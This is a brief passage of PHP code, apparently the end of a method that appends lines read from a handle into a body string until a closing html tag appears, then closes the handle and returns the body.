                $body .= $line;
                if (strpos($body, '</html')) {break;}

            }

            fclose($fp);
        }

        return $body;
    }

}
